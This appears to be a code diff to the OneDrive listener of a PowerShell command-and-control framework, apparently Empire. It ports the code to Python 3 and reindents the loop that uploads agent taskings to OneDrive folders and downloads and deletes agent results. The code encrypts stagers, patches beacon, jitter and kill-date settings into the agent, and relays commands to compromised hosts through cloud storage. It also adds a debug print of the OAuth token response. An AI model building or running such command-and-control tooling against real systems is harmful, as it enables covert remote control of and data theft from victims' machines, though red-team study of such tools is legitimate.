@@ -309,7 +309,8 @@ class Listener(object):
                 return helpers.enc_powershell(randomized_stager)
             elif encrypt:
                 RC4IV = os.urandom(4)
-                return RC4IV + encryption.rc4(RC4IV+staging_key, randomized_stager)
+                staging_key = staging_key.encode('UTF-8')
+                return RC4IV + encryption.rc4(RC4IV + staging_key, randomized_stager.encode('UTF-8'))
             else:
                 return randomized_stager
 
@@ -448,7 +449,7 @@ class Listener(object):
         lost_limit = listener_options['DefaultLostLimit']['Value']
         working_hours = listener_options['WorkingHours']['Value']
         kill_date = listener_options['KillDate']['Value']
-        b64_default_response = base64.b64encode(self.default_response())
+        b64_default_response = base64.b64encode(self.default_response().encode('UTF-8'))
 
         if language == 'powershell':
             f = open(self.mainMenu.installPath + "/data/agent/agent.ps1")
@@ -464,7 +465,7 @@ class Listener(object):
             agent_code = agent_code.replace('$AgentJitter = 0', "$AgentJitter = " + str(jitter))
             agent_code = agent_code.replace('$Profile = "/admin/get.php,/news.php,/login/process.php|Mozilla/5.0 (Windows NT 6.1; WOW64; Trident/7.0; rv:11.0) like Gecko"', "$Profile = \"" + str(profile) + "\"")
             agent_code = agent_code.replace('$LostLimit = 60', "$LostLimit = " + str(lost_limit))
-            agent_code = agent_code.replace('$DefaultResponse = ""', '$DefaultResponse = "'+b64_default_response+'"')
+            agent_code = agent_code.replace('$DefaultResponse = ""', '$DefaultResponse = "'+b64_default_response.decode('UTF-8')+'"')
 
             if kill_date != "":
                 agent_code = agent_code.replace("$KillDate,", "$KillDate = '" + str(kill_date) + "',")
@@ -484,6 +485,7 @@ class Listener(object):
             try:
                 r = s.post('https://login.microsoftonline.com/common/oauth2/v2.0/token', data=params)
                 r_token = r.json()
+                print(r_token)
                 r_token['expires_at'] = time.time() + (int)(r_token['expires_in']) - 15
                 r_token['update'] = True
                 return r_token
@@ -721,72 +723,73 @@ class Listener(object):
                         })
                         dispatcher.send(signal, sender="listeners/onedrive/{}".format(listener_name))
 
-                agent_ids = self.mainMenu.agents.get_agents_for_listener(listener_name)
-                for agent_id in agent_ids: #Upload any tasks for the current agents
-                    task_data = self.mainMenu.agents.handle_agent_request(agent_id, 'powershell', staging_key, update_lastseen=False)
-                    if task_data:
+                    agent_ids = self.mainMenu.agents.get_agents_for_listener(listener_name)
+                    for agent_id in agent_ids: #Upload any tasks for the current agents
+                        agent_id = agent_id.decode('UTF-8')
+                        task_data = self.mainMenu.agents.handle_agent_request(agent_id, 'powershell', staging_key, update_lastseen=False)
+                        if task_data:
+                            try:
+                                r = s.get("%s/drive/root:/%s/%s/%s.txt:/content" % (base_url, base_folder, taskings_folder, agent_id))
+                                if r.status_code == 200: # If there's already something there, download and append the new data
+                                    task_data = r.content + task_data
+
+                                message = "[*] Uploading agent tasks for {}, {} bytes".format(agent_id, str(len(task_data)))
+                                signal = json.dumps({
+                                    'print': False,
+                                    'message': message
+                                })
+                                dispatcher.send(signal, sender="listeners/onedrive/{}".format(listener_name))
+
+                                r = s.put("%s/drive/root:/%s/%s/%s.txt:/content" % (base_url, base_folder, taskings_folder, agent_id), data = task_data)
+                            except Exception as e:
+                                message = "[!] Error uploading agent tasks for {}, {}".format(agent_id, e)
+                                signal = json.dumps({
+                                    'print': False,
+                                    'message': message
+                                })
+                                dispatcher.send(signal, sender="listeners/onedrive/{}".format(listener_name))
+
+                    search = s.get("%s/drive/root:/%s/%s?expand=children" % (base_url, base_folder, results_folder))
+                    for item in search.json()['children']: #For each file in the results folder
                         try:
-                            r = s.get("%s/drive/root:/%s/%s/%s.txt:/content" % (base_url, base_folder, taskings_folder, agent_id))
-                            if r.status_code == 200: # If there's already something there, download and append the new data
-                                task_data = r.content + task_data
+                            agent_id = item['name'].split(".")[0]
+                            if not agent_id in agent_ids: #If we don't recognize that agent, upload a message to restage
+                                print(helpers.color("[*] Invalid agent, deleting %s/%s and restaging" % (results_folder, item['name'])))
+                                s.put("%s/drive/root:/%s/%s/%s.txt:/content" % (base_url, base_folder, taskings_folder, agent_id), data = "RESTAGE")
+                                s.delete("%s/drive/items/%s" % (base_url, item['id']))
+                                continue
 
-                            message = "[*] Uploading agent tasks for {}, {} bytes".format(agent_id, str(len(task_data)))
-                            signal = json.dumps({
-                                'print': False,
-                                'message': message
-                            })
-                            dispatcher.send(signal, sender="listeners/onedrive/{}".format(listener_name))
-                            
-                            r = s.put("%s/drive/root:/%s/%s/%s.txt:/content" % (base_url, base_folder, taskings_folder, agent_id), data = task_data)
+                            try: #Update the agent's last seen time, from the file timestamp
+                                seen_time = datetime.strptime(item['lastModifiedDateTime'], "%Y-%m-%dT%H:%M:%S.%fZ")
+                            except: #sometimes no ms for some reason...
+                                seen_time = datetime.strptime(item['lastModifiedDateTime'], "%Y-%m-%dT%H:%M:%SZ")
+                            seen_time = helpers.utc_to_local(seen_time)
+                            self.mainMenu.agents.update_agent_lastseen_db(agent_id, seen_time)
+
+                            #If the agent is just checking in, the file will only be 1 byte, so no results to fetch
+                            if(item['size'] > 1):
+                                message = "[*] Downloading results from {}/{}, {} bytes".format(results_folder, item['name'], item['size'])
+                                signal = json.dumps({
+                                    'print': False,
+                                    'message': message
+                                })
+                                dispatcher.send(signal, sender="listeners/onedrive/{}".format(listener_name))
+                                r = s.get(item['@microsoft.graph.downloadUrl'])
+                                self.mainMenu.agents.handle_agent_data(staging_key, r.content, listener_options, update_lastseen=False)
+                                message = "[*] Deleting {}/{}".format(results_folder, item['name'])
+                                signal = json.dumps({
+                                    'print': False,
+                                    'message': message
+                                })
+                                dispatcher.send(signal, sender="listeners/onedrive/{}".format(listener_name))
+                                s.delete("%s/drive/items/%s" % (base_url, item['id']))
                         except Exception as e:
-                            message = "[!] Error uploading agent tasks for {}, {}".format(agent_id, e)
+                            message = "[!] Error handling agent results for {}, {}".format(item['name'], e)
                             signal = json.dumps({
                                 'print': False,
                                 'message': message
                             })
                             dispatcher.send(signal, sender="listeners/onedrive/{}".format(listener_name))
-
-                search = s.get("%s/drive/root:/%s/%s?expand=children" % (base_url, base_folder, results_folder))
-                for item in search.json()['children']: #For each file in the results folder
-                    try:
-                        agent_id = item['name'].split(".")[0]
-                        if not agent_id in agent_ids: #If we don't recognize that agent, upload a message to restage
-                            print(helpers.color("[*] Invalid agent, deleting %s/%s and restaging" % (results_folder, item['name'])))
-                            s.put("%s/drive/root:/%s/%s/%s.txt:/content" % (base_url, base_folder, taskings_folder, agent_id), data = "RESTAGE")
-                            s.delete("%s/drive/items/%s" % (base_url, item['id']))
-                            continue
-
-                        try: #Update the agent's last seen time, from the file timestamp
-                            seen_time = datetime.strptime(item['lastModifiedDateTime'], "%Y-%m-%dT%H:%M:%S.%fZ")
-                        except: #sometimes no ms for some reason...
-                            seen_time = datetime.strptime(item['lastModifiedDateTime'], "%Y-%m-%dT%H:%M:%SZ")
-                        seen_time = helpers.utc_to_local(seen_time)
-                        self.mainMenu.agents.update_agent_lastseen_db(agent_id, seen_time)
-
-                        #If the agent is just checking in, the file will only be 1 byte, so no results to fetch
-                        if(item['size'] > 1):
-                            message = "[*] Downloading results from {}/{}, {} bytes".format(results_folder, item['name'], item['size'])
-                            signal = json.dumps({
-                                'print': False,
-                                'message': message
-                            })
-                            dispatcher.send(signal, sender="listeners/onedrive/{}".format(listener_name))
-                            r = s.get(item['@microsoft.graph.downloadUrl'])
-                            self.mainMenu.agents.handle_agent_data(staging_key, r.content, listener_options, update_lastseen=False)
-                            message = "[*] Deleting {}/{}".format(results_folder, item['name'])
-                            signal = json.dumps({
-                                'print': False,
-                                'message': message
-                            })
-                            dispatcher.send(signal, sender="listeners/onedrive/{}".format(listener_name))
-                            s.delete("%s/drive/items/%s" % (base_url, item['id']))
-                    except Exception as e:
-                        message = "[!] Error handling agent results for {}, {}".format(item['name'], e)
-                        signal = json.dumps({
-                            'print': False,
-                            'message': message
-                        })
-                        dispatcher.send(signal, sender="listeners/onedrive/{}".format(listener_name))
 
             except Exception as e:
                 print(helpers.color("[!] Something happened in listener %s: %s, continuing" % (listener_name, e)))
